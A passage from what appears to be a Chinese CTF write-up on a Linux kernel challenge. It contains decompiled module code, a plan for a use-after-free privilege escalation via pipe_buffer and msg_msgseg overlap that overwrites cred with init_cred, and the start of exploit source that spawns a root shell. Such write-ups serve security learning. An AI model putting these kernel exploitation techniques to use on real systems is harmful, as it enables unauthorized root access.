class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __noreturn <span class="hljs-title function_">kkk_msg_handler_fn</span><span class="hljs-params">()</span><br>&#123;<br>  __int64 v0; <span class="hljs-comment">// r14</span><br>  <span class="hljs-type">int</span> v1; <span class="hljs-comment">// esi</span><br>  <span class="hljs-type">unsigned</span> __int64 v2; <span class="hljs-comment">// rdi</span><br>  __int64 v3; <span class="hljs-comment">// rax</span><br>  __int64 v4; <span class="hljs-comment">// r15</span><br>  __int64 v5; <span class="hljs-comment">// rax</span><br>  __int64 v6; <span class="hljs-comment">// rax</span><br>  __int16 v7; <span class="hljs-comment">// cx</span><br>  <span class="hljs-type">unsigned</span> __int64 v8; <span class="hljs-comment">// rdi</span><br>  __int64 v9; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">void</span> *v10; <span class="hljs-comment">// rdi</span><br>  __int64 v11[<span class="hljs-number">4</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-20h] BYREF</span><br><br>  v11[<span class="hljs-number">0</span>] = <span class="hljs-number">0LL</span>;<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  &#123;<br>    <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>    &#123;<br>      <span class="hljs-keyword">while</span> ( (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)kkk_read_u2k_queue(v11) )<br>        msleep(<span class="hljs-number">1000LL</span>);<br>      v0 = v11[<span class="hljs-number">0</span>];<br>      <span class="hljs-keyword">if</span> ( *(_WORD *)v11[<span class="hljs-number">0</span>] == <span class="hljs-number">1</span> )<br>        <span class="hljs-keyword">break</span>;<br>      printk(&amp;unk_1743);<br>LABEL_24:<br>      msg_free(v11[<span class="hljs-number">0</span>]);<br>    &#125;<br></code></pre></td></tr></table></figure><p>接下来是一个巨大的 switch，根据从 <code>u2k</code> 队列中取出的 object 指定字段的值进行相应处理，主要实现了 <code>tea</code> 加密、<code>tea</code> 解密、<code>md5</code> 哈希算法三种功能</p><p>在完成请求后会根据选项不同与执行结果不同选择是否将该 object 重用并写入 <code>k2u</code> 队列或是分配一个新的 <code>object</code> 写入 <code>k2u</code> 队列，对于 <code>md5</code> 哈希请求而言总会分配一个新的 object，而 <code>tea</code> 加解密请求则会，作为请求执行的结果返回给用户：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs c">    <span class="hljs-keyword">switch</span> ( v1 )<br>    &#123;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>        v5 = msg_alloc(<span class="hljs-number">16LL</span>);<br>        <span class="hljs-keyword">if</span> ( v5 )<br>        &#123;<br>          v4 = v5;<br>          <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)kkk_crypto_hash_md5((<span class="hljs-type">void</span> *)(v0 + <span class="hljs-number">24</span>), *(_QWORD *)(v0 + <span class="hljs-number">16</span>)) )<br>          &#123;<br>            printk(&amp;unk_17E1);<br>            v7 = <span class="hljs-number">2</span>;<br>            v6 = <span class="hljs-number">0LL</span>;<br>          &#125;<br>          <span class="hljs-keyword">else</span><br>          &#123;<br>            v6 = <span class="hljs-number">16LL</span>;<br>            v7 = <span class="hljs-number">1</span>;<br>          &#125;<br>          *(_DWORD *)v4 = <span class="hljs-number">196610</span>;<br>          *(_WORD *)(v4 + <span class="hljs-number">4</span>) = v7;<br>          *(_QWORD *)(v4 + <span class="hljs-number">8</span>) = *(_QWORD *)(v0 + <span class="hljs-number">8</span>);<br>          <span class="hljs-keyword">goto</span> LABEL_23;<br>        &#125;<br>        <span class="hljs-keyword">goto</span> LABEL_32;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>        v8 = *(_QWORD *)(v11[<span class="hljs-number">0</span>] + <span class="hljs-number">16</span>);<br>        <span class="hljs-keyword">if</span> ( v8 &lt; <span class="hljs-number">0x18</span> || (v8 &amp; <span class="hljs-number">7</span>) != <span class="hljs-number">0</span> )<br>        &#123;<br>          v10 = &amp;unk_17AD;<br>          <span class="hljs-keyword">goto</span> LABEL_31;<br>        &#125;<br>        v9 = msg_alloc(v8 - <span class="hljs-number">16</span>);<br>        <span class="hljs-keyword">if</span> ( !v9 )<br>        &#123;<br>LABEL_27:<br>          v10 = &amp;unk_1795;<br>LABEL_31:<br>          printk(v10);<br>          <span class="hljs-keyword">goto</span> LABEL_32;<br>        &#125;<br>        v4 = v9;<br>        <span class="hljs-keyword">if</span> ( (<span class="hljs-type">int</span>)kkk_crypto_tea_decrypt((<span class="hljs-type">void</span> *)(v0 + <span class="hljs-number">40</span>), *(_QWORD *)(v0 + <span class="hljs-number">16</span>) - <span class="hljs-number">16LL</span>) &gt;= <span class="hljs-number">0</span> )<br>        &#123;<br>          *(_DWORD *)v4 = <span class="hljs-number">131074</span>;<br>LABEL_22:<br>          *(_WORD *)(v4 + <span class="hljs-number">4</span>) = <span class="hljs-number">1</span>;<br>          *(_QWORD *)(v4 + <span class="hljs-number">8</span>) = *(_QWORD *)(v0 + <span class="hljs-number">8</span>);<br>          v6 = *(_QWORD *)(v0 + <span class="hljs-number">16</span>) - <span class="hljs-number">16LL</span>;<br>LABEL_23:<br>          *(_QWORD *)(v4 + <span class="hljs-number">16</span>) = v6;<br>          kkk_write_k2u_queue(v4);<br>          <span class="hljs-keyword">goto</span> LABEL_24;<br>        &#125;<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>        v2 = *(_QWORD *)(v11[<span class="hljs-number">0</span>] + <span class="hljs-number">16</span>);<br>        <span class="hljs-keyword">if</span> ( v2 &lt; <span class="hljs-number">0x18</span> || (v2 &amp; <span class="hljs-number">7</span>) != <span class="hljs-number">0</span> )<br>        &#123;<br>          v10 = &amp;unk_1761;<br>          <span class="hljs-keyword">goto</span> LABEL_31;<br>        &#125;<br>        v3 = msg_alloc(v2 - <span class="hljs-number">16</span>);<br>        <span class="hljs-keyword">if</span> ( !v3 )<br>          <span class="hljs-keyword">goto</span> LABEL_27;<br>        v4 = v3;<br>        <span class="hljs-keyword">if</span> ( (<span class="hljs-type">int</span>)kkk_crypto_tea_encrypt((<span class="hljs-type">void</span> *)(v0 + <span class="hljs-number">40</span>), *(_QWORD *)(v0 + <span class="hljs-number">16</span>) - <span class="hljs-number">16LL</span>) &gt;= <span class="hljs-number">0</span> )<br>        &#123;<br>          *(_DWORD *)v4 = (_DWORD)&amp;unk_10002;<br>          <span class="hljs-keyword">goto</span> LABEL_22;<br>        &#125;<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">default</span>:<br>        *(_WORD *)v11[<span class="hljs-number">0</span>] = <span class="hljs-number">2</span>;<br>        *(_WORD *)(v0 + <span class="hljs-number">4</span>) = <span class="hljs-number">2</span>;<br>        printk(&amp;unk_1808);<br>        <span class="hljs-keyword">goto</span> LABEL_33;<br>    &#125;<br>    kfree(v4);<br>LABEL_32:<br>    *(_WORD *)v0 = <span class="hljs-number">2</span>;<br>    *(_WORD *)(v0 + <span class="hljs-number">4</span>) = <span class="hljs-number">2</span>;<br>LABEL_33:<br>    kkk_write_k2u_queue(v0);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>逆向分析我们不难获得 <code>u2k</code> 与 <code>k2u</code> 队列中的 object 的结构体定义：</p><blockquote><p><del>👴自己逆半天得的，没有偷偷看源码</del></p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> TYPE_REQUEST    1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> TYPE_REPLY      2</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CMD_ENCRYPT_TEA     1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CMD_DECRYPT_TEA     2</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CMD_HASH_MD5        3</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> STATUS_SUCCESS      1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> STATUS_FAIL         2</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_hdr</span> &#123;</span><br>    <span class="hljs-type">uint16_t</span> type;<br>    <span class="hljs-type">uint16_t</span> cmd;<br>    <span class="hljs-type">uint32_t</span> status;<br>    <span class="hljs-type">uint64_t</span> tag;<br>    <span class="hljs-type">uint64_t</span> data_len;<br>    <span class="hljs-type">uint8_t</span> data[<span class="hljs-number">0</span>];<br>&#125;;<br></code></pre></td></tr></table></figure><p>那么这个内核模块的全貌便已经展现在我们面前了：用户通过 <code>ioctl()</code> 向请求队列 <code>u2k</code> 中放入请求消息（每条消息附带一个 header），内核线程异步地从 <code>u2k</code> 队列中读取消息，根据其类型进行处理，完成之后将结果放回 <code>k2u</code> 队列，由用户进行异步读取；对于请求与响应消息长度相同的，内核会复用相应的 object，否则会分配新的 object 作为返回结果并释放储存原有请求信息的 object</p><p>严格意义上来说这道题其实没有完全完成，笔者原本想要写一个完整的用户与内核间的  <em>异步通信消息处理框架</em>  ，但是最后只完成了异步通信队列，没有完成基于内存共享的状态查询部分，不过我们仍能通过 <code>ioctl()</code> 直接读取的方式完成轮询，就是开销巨大：）</p><h2 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>利用 UAF 将 <code>pipe_buffer</code> 和 <code>msg_msgseg</code> 分配到一起，读写 pipe 使得其使用 <code>pipe_buffer[1]</code> 以避免 <code>msg_msgseg</code> 开头的 NULL 干扰，之后不断重分配 <code>msg_msgseg</code> 进行内存搜索找到当前进程的 <code>task_struct</code> 并将 <code>task_struct-&gt;cred</code> 改为 <code>init_cred</code> 即可完成提权</p><p>这里没有选择将两个 <code>pipe_buffer</code> 分配到同一个 object 的方式是因为<strong>题目开启了</strong> <code>CONFIG_INIT_ON_FREE_DEFAULT_ON</code> <strong>，所有的内核对象在释放后都会被清零</strong>，因此我们很难直接构造出 page-level UAF</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/prctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/msg.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ipc.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * I - fundamental functions</span><br><span class="hljs-comment"> * e.g. CPU-core binder, user-status saver, etc.</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-type">size_t</span> kernel_base = <span class="hljs-number">0xffffffff81000000</span>, kernel_offset = <span class="hljs-number">0</span>;<br><span class="hljs-type">size_t</span> page_offset_base = <span class="hljs-number">0xffff888000000000</span>, vmemmap_base = <span class="hljs-number">0xffffea0000000000</span>;<br><span class="hljs-type">size_t</span> init_task, init_nsproxy, init_cred;<br><br><span class="hljs-type">size_t</span> <span class="hljs-title function_">direct_map_addr_to_page_addr</span><span class="hljs-params">(<span class="hljs-type">size_t</span> direct_map_addr)</span><br>&#123;<br>    <span class="hljs-type">size_t</span> page_count;<br><br>    page_count = ((direct_map_addr &amp; (~<span class="hljs-number">0xfff</span>)) - page_offset_base) / <span class="hljs-number">0x1000</span>;<br>    <br>    <span class="hljs-keyword">return</span> vmemmap_base + page_count * <span class="hljs-number">0x40</span>;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">err_exit</span><span class="hljs-params">(<span class="hljs-type">char</span> *msg)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);<br>    sleep(<span class="hljs-number">5</span>);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><span class="hljs-comment">/* root checker and shell poper */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">get_root_shell</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] checking for root...&quot;</span>);<br><br>    <span class="hljs-keyword">if</span>(getuid()) &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m&quot;</span>);<br>        sleep(<span class="hljs-number">5</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful to get the root. \033[0m&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Execve root shell now...\033[0m&quot;</span>);<br>    <br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>    <br>    <span class="hljs-comment">/* to exit the process normally, instead of segmentation fault */</span><br>    <span class="hljs-built_in">exit</span>(EXIT_SUCCESS);<br>&#125;<br><br><span class="hljs-comment">/* userspace status saver */</span><br><span class="hljs-type">size_t</span> user_cs, user_ss, user_rflags, user_sp;<br><span class="hljs-type">void</span> <span class="hljs-title function_">save_status</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-keyword">asm</span> <span class="hljs-title function_">volatile</span> <span class="hljs-params">(</span><br><span class="hljs-params">        <span class="hljs-string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;pushf;&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;pop user_rflags;&quot;</span></span><br><span class="hljs-params">    )</span>;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">/* bind the process to specific core */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">bind_core</span><span class="hljs-params">(<span class="hljs-type">int</span> core)</span><br>&#123;<br>    <span class="hljs-type">cpu_set_t</span> cpu_set;<br><br>    CPU_ZERO(&amp;cpu_set);<br>    CPU_SET(core, &amp;cpu_set);<br>    sched_setaffinity(getpid(), <span class="hljs-keyword">sizeof</span>(cpu_set), &amp;cpu_set);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Process binded to core \033[0m%d\n&quot;</span>, core);<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_inode_info</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span>;</span><br><br><span class="hljs-comment">/* read start from len to offset, write start from offset */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> offset, len;<br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span> *<span class="hljs-title">ops</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> private;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span> &#123;</span><br>    <span class="hljs-type">int</span> (*confirm)(<span class="hljs-keyword">struct</span> pipe_inode_info *, <span class="hljs-keyword">struct</span> pipe_buffer *);<br>    <span class="hljs-type">void</span> (*release)(<span class="hljs-keyword">struct</span> pipe_inode_info *, <span class="hljs-keyword">struct</span> pipe_buffer *);<br>    <span class="hljs-type">int</span> (*try_steal)(<span class="hljs-keyword">struct</span> pipe_inode_info *, <span class="hljs-keyword">struct</span> pipe_buffer *);<br>    <span class="hljs-type">int</span> (*get)(<span class="hljs-keyword">struct</span> pipe_inode_info *, <span 